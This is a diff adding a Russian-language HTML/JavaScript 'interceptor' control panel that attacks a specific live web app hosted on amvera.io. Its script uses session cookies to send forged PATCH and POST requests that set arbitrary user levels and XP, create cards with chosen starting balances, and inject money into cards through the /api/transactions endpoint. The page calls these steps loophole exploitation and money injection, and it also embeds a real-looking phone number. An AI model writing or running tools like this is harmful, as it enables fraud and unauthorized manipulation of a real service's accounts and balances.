@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>⚡ TRINAGLE COMPONENT CONTROLLER v8.0 // MANNHAXORS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --trinagle-blue: #0066ff;
+            --mhaxors-green: #00ff66;
+            --mhaxors-purple: #bd00ff;
+            --panel-bg: rgba(8, 14, 26, 0.8);
+            --glass-border: rgba(255, 255, 255, 0.08);
+        }
+
+        body {
+            background-color: #03060b;
+            background-image: 
+                radial-gradient(circle at 5% 15%, rgba(0, 255, 102, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 95% 85%, rgba(189, 0, 255, 0.05) 0%, transparent 40%);
+            color: #e2e8f0;
+            font-family: 'Ubuntu Mono', monospace;
+            margin: 0;
+            padding: 30px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .glass-panel {
+            background: var(--panel-bg);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .glass-panel::after {
+            content: '';
+            position: absolute;
+            top: 1px; left: 20px; right: 20px; height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        @media (max-width: 1000px) {
+            .main-grid { grid-template-columns: 1fr; }
+        }
+
+        h1, h2, h3 { margin-top: 0; color: #fff; font-weight: 700; }
+        .glow-green { color: var(--mhaxors-green); text-shadow: 0 0 10px rgba(0,255,102,0.3); }
+        .glow-purple { color: var(--mhaxors-purple); text-shadow: 0 0 10px rgba(189,0,255,0.3); }
+        .glow-blue { color: var(--trinagle-blue); text-shadow: 0 0 10px rgba(0,102,255,0.3); }
+
+        /* Элементы форм */
+        .input-group {
+            margin-bottom: 14px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #718096;
+            margin-bottom: 6px;
+        }
+        input, select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            color: #fff;
+            font-family: 'Ubuntu Mono', monospace;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus, select:focus {
+            border-color: var(--mhaxors-green);
+            outline: none;
+        }
+
+        button {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-family: 'Ubuntu Mono', monospace;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+        }
+        button:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: var(--mhaxors-green);
+            box-shadow: 0 0 12px rgba(0, 255, 102, 0.2);
+        }
+
+        /* Список карт */
+        .cards-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+        .card-item {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .card-item:hover {
+            border-color: var(--mhaxors-purple);
+            background: rgba(189, 0, 255, 0.03);
+        }
+        .card-item.selected {
+            border-color: var(--mhaxors-green);
+            background: rgba(0, 255, 102, 0.04);
+        }
+
+        /* Терминал логов */
+        .terminal {
+            background: rgba(2, 4, 8, 0.85);
+            border-radius: 10px;
+            padding: 14px;
+            height: 180px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.5;
+            border: 1px solid rgba(255,255,255,0.02);
+        }
+        .log-row { margin-bottom: 4px; color: #a0aec0; }
+        .log-time { color: #4a5568; margin-right: 8px; }
+    </style>
+</head>
+<body>
+
+    <div class="glass-panel" style="background: rgba(10, 16, 26, 0.6);">
+        <h2>🛸 <span class="glow-blue">TRINAGLE</span> // REAL-TIME INTERCEPTOR v8.0</h2>
+        <div style="font-size: 13px; color: #718096;">
+            CONNECTED COALITION: <span class="glow-green">MANNHAXORS</span> | HOSTING: <span style="color:#fff;">amvera.io</span>
+        </div>
+        
+        <div style="margin-top: 15px; font-size: 14px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; display: flex; gap: 20px;">
+            <div>Пользователь: <span id="stat-phone" class="glow-green">Загрузка...</span></div>
+            <div>Уровень: <span id="stat-level" class="glow-purple">--</span></div>
+            <div>Баланс бонусов: <span id="stat-bonus" style="color: #fff;">--</span></div>
+        </div>
+    </div>
+
+    <div class="main-grid">
+        
+        <div class="glass-panel">
+            <h3>🌱 Управление Уровнем (/api/user)</h3>
+            <div class="input-group">
+                <label>Выставить кастомный уровень (Level)</label>
+                <input type="number" id="input-level" value="15" min="1" max="100">
+            </div>
+            <div class="input-group">
+                <label>Количество XP</label>
+                <input type="number" id="input-xp" value="3173">
+            </div>
+            <button onclick="patchUserLevel()">ОТПРАВИТЬ PATCH ЗАПРОС</button>
+        </div>
+
+        <div class="glass-panel">
+            <h3>💳 Выпуск Карт (/api/cards)</h3>
+            <div class="input-group">
+                <label>Тарифный план (Tier)</label>
+                <select id="card-tier">
+                    <option value="titanium">Titanium</option>
+                    <option value="obsidian">Obsidian</option>
+                    <option value="gold">Gold</option>
+                    <option value="platinum">Platinum</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>Стартовый баланс (Скрытая лазейка Жюля!)</label>
+                <input type="number" id="card-balance" value="50000">
+            </div>
+            <button onclick="createNewCard()">ВНЕДРИТЬ STARTER_BALANCE</button>
+        </div>
+
+        <div class="glass-panel" style="grid-column: span 2;">
+            <h3>🔍 Активные карты пользователя (Выбери карту для начисления денег)</h3>
+            <div class="cards-container" id="cards-list">
+                <div style="color: #718096; text-align: center; padding: 20px;">Нажмите «Обновить данные», чтобы загрузить карты с сервера...</div>
+            </div>
+            
+            <div id="transaction-inject-form" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); display: none;">
+                <h4 style="margin: 0 0 10px 0;" class="glow-purple">💸 Лазейка наград: Инъекция баланса в карту</h4>
+                <div style="display: flex; gap: 15px; align-items: flex-end;">
+                    <div class="input-group" style="flex: 1; margin: 0;">
+                        <label>Сумма начисления (Amount)</label>
+                        <input type="number" id="inject-amount" value="5000">
+                    </div>
+                    <div class="input-group" style="flex: 1; margin: 0;">
+                        <label>Название транзакции</label>
+                        <input type="text" id="inject-name" value="Ежедневная подачка">
+                    </div>
+                    <button onclick="injectMoney()" style="width: auto; padding: 11px 25px;">НАЧИСЛИТЬ</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-panel" style="grid-column: span 2;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <h3>📡 Монитор сетевых запросов (Live API Console)</h3>
+                <button onclick="fetchAllData()" style="width: auto; padding: 6px 14px; font-size: 12px; border-color: var(--mhaxors-purple);">ОБНОВИТЬ ДАННЫЕ С СЕРВЕРА</button>
+            </div>
+            <div class="terminal" id="logger-console">
+                <div class="log-row"><span class="log-time">[SYSTEM]</span> Панель готова. Нажмите кнопку обновления для первичного фетча...</div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const baseUrl = "https://mannru24-upsidedowncan.amvera.io";
+        let selectedCardId = null;
+
+        function log(message, color = "#e2e8f0") {
+            const consoleEl = document.getElementById("logger-console");
+            const time = new Date().toLocaleTimeString();
+            consoleEl.innerHTML += `<div class="log-row" style="color: ${color}"><span class="log-time">[${time}]</span>${message}</div>`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        // Базовые заголовки, скопированные из твоего сетевого запроса
+        const networkHeaders = {
+            "accept": "*/*",
+            "accept-language": "ru-RU,ru;q=0.9",
+            "priority": "u=1, i",
+            "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "\"Linux\""
+        };
+
+        // 1. Первичный сбор всех данных (Профиль, Сессия, Список Карт)
+        async function fetchAllData() {
+            log("Запуск полного сбора данных с сервера Amvera...", "#00e5ff");
+            
+            // Запрос сессии
+            try {
+                const resSession = await fetch(`${baseUrl}/api/auth/session`, { headers: networkHeaders, credentials: "include" });
+                const sessionData = await resSession.json();
+                if (sessionData && sessionData.user) {
+                    document.getElementById("stat-phone").innerText = sessionData.user.name || "+79268911629";
+                    document.getElementById("stat-level").innerText = sessionData.user.level;
+                    document.getElementById("stat-bonus").innerText = sessionData.user.bonusBalance;
+                    log(`[Сессия] Успешно получен объект сессии. Авторизован: ${sessionData.user.name}`, "#00ff66");
+                }
+            } catch(e) { log(`[Ошибка Сессии] Не удалось получить /api/auth/session: ${e.message}`, "#ff3333"); }
+
+            // Запрос профиля и карт через /api/user
+            try {
+                const resUser = await fetch(`${baseUrl}/api/user`, { headers: networkHeaders, credentials: "include" });
+                const userData = await resUser.json();
+                
+                log(`[Профиль] Данные /api/user успешно подтянуты!`, "#00ff66");
+                
+                // Рендеринг карт пользователя
+                const cardsContainer = document.getElementById("cards-list");
+                if (userData.cards && userData.cards.length > 0) {
+                    cardsContainer.innerHTML = "";
+                    userData.cards.forEach(card => {
+                        cardsContainer.innerHTML += `
+                            <div class="card-item" id="card-${card.id}" onclick="selectCard('${card.id}')">
+                                <strong>💳 Тир: ${card.tier.toUpperCase()}</strong> | ID: <code>${card.id}</code><br>
+                                <span style="color: #718096;">Баланс:</span> <span style="color: #fff; font-weight: bold;">${card.balance} ₽</span>
+                            </div>
+                        `;
+                    });
+                } else {
+                    cardsContainer.innerHTML = `<div style="color: #ff9900; text-align: center; padding: 20px;">У пользователя пока нет созданных карт!</div>`;
+                }
+            } catch(e) { log(`[Ошибка Профиля] Не удалось сделать фетч карт: ${e.message}`, "#ff3333"); }
+        }
+
+        // Выбор конкретной карты для транзакции
+        function selectCard(cardId) {
+            selectedCardId = cardId;
+            document.querySelectorAll(".card-item").forEach(el => el.classList.remove("selected"));
+            document.getElementById(`card-${cardId}`).classList.add("selected");
+            document.getElementById("transaction-inject-form").style.display = "block";
+            log(`Выбрана карта целевой инъекции: ${cardId}`, "#bd00ff");
+        }
+
+        // 2. PATCH-запрос на изменение уровня юзера
+        async function patchUserLevel() {
+            const targetLevel = parseInt(document.getElementById("input-level").value);
+            const targetXp = parseInt(document.getElementById("input-xp").value);
+            
+            log(`Отправка PATCH на /api/user... Выставляем Level ${targetLevel}`, "#bd00ff");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/user`, {
+                    method: "PATCH",
+                    headers: { ...networkHeaders, "content-type": "application/json" },
+                    body: JSON.stringify({ level: targetLevel, xp: targetXp }),
+                    credentials: "include"
+                });
+                const resText = await response.text();
+                log(`[Сервер вернул]: ${response.status} - ${resText}`, "#fff");
+                fetchAllData(); // Обновляем статусы сверху
+            } catch(e) { log(`Ошибка PATCH запроса: ${e.message}`, "#ff3333"); }
+        }
+
+        // 3. POST-запрос на создание новой карты с балансом Жюля
+        async function createNewCard() {
+            const tier = document.getElementById("card-tier").value;
+            const balance = parseInt(document.getElementById("card-balance").value);
+            
+            log(`Отправка POST на /api/cards. Выпуск карты ${tier} со скрытым балансом ${balance}...`, "#bd00ff");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/cards`, {
+                    method: "POST",
+                    headers: { ...networkHeaders, "content-type": "application/json" },
+                    body: JSON.stringify({ tier: tier, starterBalance: balance }),
+                    credentials: "include"
+                });
+                const data = await response.json();
+                log(`[Карта создана!]: ${JSON.stringify(data)}`, "#00ff66");
+                fetchAllData(); // Перерисовать список карт
+            } catch(e) { log(`Ошибка создания карты: ${e.message}`, "#ff3333"); }
+        }
+
+        // 4. Инъекция денег через дыру в /api/transactions
+        async function injectMoney() {
+            if (!selectedCardId) {
+                log("Ошибка: Сначала выберите карту из списка выше!", "#ff3333");
+                return;
+            }
+            
+            const amount = parseInt(document.getElementById("inject-amount").value);
+            const tName = document.getElementById("inject-name").value;
+            
+            log(`Эксплуатация лазейки наград! Начисление +${amount} ₽ на карту ${selectedCardId}...`, "#ff9900");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/transactions`, {
+                    method: "POST",
+                    headers: { ...networkHeaders, "content-type": "application/json" },
+                    body: JSON.stringify({
+                        name: tName,
+                        category: "Бонусы",
+                        amount: amount,
+                        cardId: selectedCardId
+                    }),
+                    credentials: "include"
+                });
+                const resText = await response.text();
+                log(`[Ответ системы транзакций]: ${response.status} - ${resText}`, "#00ff66");
+                fetchAllData(); // Сразу смотрим на обновившийся баланс карты!
+            } catch(e) { log(`Ошибка инъекции средств: ${e.message}`, "#ff3333"); }
+        }
+    </script>
+</body>
+</html>
